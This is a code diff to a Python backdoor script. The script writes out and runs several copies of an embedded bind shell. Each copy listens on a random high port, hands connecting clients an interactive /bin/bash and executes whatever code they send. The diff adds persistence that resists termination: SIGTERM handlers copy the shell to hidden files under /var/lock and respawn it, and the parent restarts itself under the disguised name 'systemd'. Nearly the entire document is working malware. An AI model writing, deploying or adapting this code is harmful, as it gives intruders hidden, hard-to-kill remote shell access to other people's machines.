@@ -1,24 +1,39 @@
 #!/usr/bin/python3
-import os, subprocess, socket, sys, time
+import os, subprocess, socket, sys, time, signal
 from random import randint
 
 s = \
 """
 #!/usr/bin/python3
 import socket as a
-import os
+import os, subprocess, signal
 from random import randint
+
+fname = os.path.abspath(__file__)
+
+def sigTermHandler(signal, frame):
+        newfname = '/var/lock/.sys-'+str(randint(11111111111111,99999999999999))
+        os.system('cp ' + fname + ' ' + newfname)
+        procs = []
+        for i in range(0, 2):
+                proc = subprocess.Popen(['python3', newfname]) 
+                procs.append(proc)
+signal.signal(signal.SIGTERM, sigTermHandler)
+
 while True:
         s = a.socket()
         pnum = randint(60000,65000)
         s.bind(('0.0.0.0',pnum))
         s.listen(1)
         (r,z) = s.accept()
-        exec('import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()')                                               
+        exec('import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()')
         exec(r.recv(999))
 """
 procs = []
 maxNumProcs = 10
+if len(sys.argv) > 1:
+	maxNumProcs =int( sys.argv[1])
+
 # WRITE OUT SHELL
 def writeShell():
 	fname = str(randint(11111111111111,99999999999999))
@@ -42,7 +57,12 @@ def checkRunning():
 			del procs[p]
 	while (len(procs) < maxNumProcs):
 		startProc()
+# CATCH SIGTERM :d
+def sigTermHandler(signal, frame):
+	for i in range(0, 2):
+		subprocess.Popen(['python3', 'systemd'])
 
+signal.signal(signal.SIGTERM, sigTermHandler)
 # LOOP
 while True:
 	time.sleep(10)
